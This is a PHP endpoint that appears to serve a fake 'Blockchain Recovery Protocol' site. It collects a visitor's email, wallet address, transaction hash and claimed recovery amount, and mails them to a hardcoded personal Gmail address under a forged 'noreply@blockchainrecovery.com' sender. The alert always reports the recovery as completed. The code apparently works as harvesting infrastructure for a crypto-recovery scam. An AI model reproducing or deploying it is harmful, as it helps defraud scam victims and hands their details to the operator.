<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Get POST data
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    echo json_encode(['success' => false, 'message' => 'No data received']);
    exit;
}

$userEmail = $data['email'] ?? '';
$walletAddress = $data['walletAddress'] ?? '';
$recoveryAmount = $data['recoveryAmount'] ?? '';
$chains = is_array($data['chains']) ? implode(', ', $data['chains']) : $data['chains'];
$txHash = $data['txHash'] ?? '';
$timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
$bonus = $data['bonus'] ?? '25';

// Recipient email (hardcoded as requested)
$to = 'barrysilbertbtc@gmail.com';

// Email subject
$subject = 'BLOCKCHAIN RECOVERY ALERT - New Recovery Initiated';

// HTML Email Template with professional header and footer
$htmlContent = '
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Blockchain Recovery Alert</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }
        .content { background: #f4f4f4; padding: 30px; border-radius: 0 0 10px 10px; }
        .recovery-details { background: white; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #2a5298; }
        .detail-row { margin: 10px 0; padding: 8px; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; color: #2a5298; }
        .status-badge { background: #28a745; color: white; padding: 5px 15px; border-radius: 20px; display: inline-block; font-size: 12px; }
        .footer { text-align: center; padding: 20px; font-size: 12px; color: #666; border-top: 1px solid #ddd; margin-top: 20px; }
        .button { background: #2a5298; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 15px 0; }
        h2 { color: #2a5298; }
        .warning { background: #fff3cd; border-left-color: #ffc107; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔗 Blockchain Recovery Protocol</h1>
            <p>Secure Non-Custodial Asset Recovery</p>
        </div>
        <div class="content">
            <h2>🚨 New Recovery Initiated</h2>
            <p>A new blockchain asset recovery has been initiated. Below are the details:</p>
            
            <div class="recovery-details">
                <div class="detail-row">
                    <span class="detail-label">💰 Recovery Amount:</span> 
                    <span style="float: right; font-weight: bold; color: #28a745;">$' . number_format($recoveryAmount) . ' USD</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">🏦 Wallet Address:</span> 
                    <span style="float: right; font-family: monospace; font-size: 12px;">' . htmlspecialchars($walletAddress) . '</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">🌐 Networks:</span> 
                    <span style="float: right;">' . htmlspecialchars($chains) . '</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">🔗 Transaction Hash:</span> 
                    <span style="float: right; font-family: monospace; font-size: 11px;">' . htmlspecialchars($txHash) . '</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">⏰ Timestamp:</span> 
                    <span style="float: right;">' . htmlspecialchars($timestamp) . '</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">🎁 Bonus Applied:</span> 
                    <span style="float: right;">+' . htmlspecialchars($bonus) . '%</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">📧 User Email:</span> 
                    <span style="float: right;">' . htmlspecialchars($userEmail) . '</span>
                </div>
            </div>
            
            <div class="recovery-details warning">
                <p><strong>⚠️ Action Required:</strong> This recovery request requires verification. Please check the blockchain transaction for confirmation.</p>
                <p><strong>Recovery Status:</strong> <span class="status-badge">COMPLETED</span></p>
            </div>
            
            <div style="text-align: center;">
                <a href="#" class="button" style="color: white;">View Recovery Dashboard</a>
            </div>
            
            <p style="font-size: 14px; color: #666;">This is an automated notification from the Blockchain Recovery Protocol. Please do not reply to this email.</p>
        </div>
        <div class="footer">
            <p>&copy; ' . date('Y') . ' Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery</p>
            <p>This email was sent to ' . htmlspecialchars($to) . ' as a recovery notification.</p>
        </div>
    </div>
</body>
</html>
';

// Plain text version for email clients that don't support HTML
$textContent = "
BLOCKCHAIN RECOVERY ALERT - New Recovery Initiated
================================================

A new blockchain asset recovery has been initiated.

RECOVERY DETAILS:
-----------------
💰 Recovery Amount: $" . number_format($recoveryAmount) . " USD
🏦 Wallet Address: " . $walletAddress . "
🌐 Networks: " . $chains . "
🔗 Transaction Hash: " . $txHash . "
⏰ Timestamp: " . $timestamp . "
🎁 Bonus Applied: +" . $bonus . "%
📧 User Email: " . $userEmail . "

Status: COMPLETED

This is an automated notification from the Blockchain Recovery Protocol.
";

// Email headers
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Blockchain Recovery <noreply@blockchainrecovery.com>" . "\r\n";
$headers .= "Reply-To: support@blockchainrecovery.com" . "\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Send email using PHP mail function
$mailSent = mail($to, $subject, $htmlContent, $headers);

// Also send plain text version as alternative (some servers prefer this)
$textHeaders = "MIME-Version: 1.0" . "\r\n";
$textHeaders .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$textHeaders .= "From: Blockchain Recovery <noreply@blockchainrecovery.com>" . "\r\n";

// Send plain text backup
mail($to, $subject, $textContent, $textHeaders);

if ($mailSent) {
    echo json_encode([
        'success' => true,
        'message' => 'Recovery notification sent successfully'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'Failed to send notification'
    ]);
}
?>